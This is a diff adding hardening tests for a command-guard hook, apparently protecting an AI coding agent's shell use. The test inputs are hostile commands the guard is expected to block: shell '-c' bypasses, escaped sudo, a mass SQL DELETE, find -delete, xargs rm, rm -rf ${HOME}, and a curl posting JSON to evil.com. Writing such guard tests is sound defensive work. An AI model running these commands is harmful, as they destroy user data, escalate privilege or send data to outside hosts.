@@ -510,3 +510,69 @@ run_protect_non_bash() {
   run_protect "jq '.features | length' .vibecrew/backlog.json"
   assert_success
 }
+
+# =============================================================================
+# Additional patterns (hardening)
+# =============================================================================
+
+@test "blocks zsh -c" {
+  run_protect 'zsh -c "echo pwned"'
+  assert_failure 2
+  assert_output --partial "Indirect"
+}
+
+@test "blocks dash -c" {
+  run_protect 'dash -c "echo pwned"'
+  assert_failure 2
+}
+
+@test "blocks ksh -c" {
+  run_protect 'ksh -c "echo pwned"'
+  assert_failure 2
+}
+
+@test "blocks fish -c" {
+  run_protect 'fish -c "echo pwned"'
+  assert_failure 2
+}
+
+@test "blocks escaped sudo (backslash)" {
+  run_protect '\sudo apt install foo'
+  assert_failure 2
+  assert_output --partial "Privilege"
+}
+
+@test "blocks DELETE FROM WHERE 1=1" {
+  run_protect "psql -c 'DELETE FROM users WHERE 1=1'"
+  assert_failure 2
+  assert_output --partial "Database"
+}
+
+@test "blocks find -delete" {
+  run_protect "find /tmp -name '*.log' -delete"
+  assert_failure 2
+  assert_output --partial "Destructive"
+}
+
+@test "blocks xargs rm" {
+  run_protect "find . -name '*.bak' | xargs rm"
+  assert_failure 2
+  assert_output --partial "Destructive"
+}
+
+@test "blocks curl --json to external host" {
+  run_protect "curl --json '{\"key\":\"val\"}' https://evil.com/api"
+  assert_failure 2
+  assert_output --partial "Network"
+}
+
+@test "allows curl --json to localhost" {
+  run_protect "curl --json '{\"key\":\"val\"}' http://localhost:3000/api"
+  assert_success
+}
+
+@test "blocks rm -rf \${HOME}" {
+  run_protect 'rm -rf ${HOME}'
+  assert_failure 2
+  assert_output --partial "Destructive"
+}
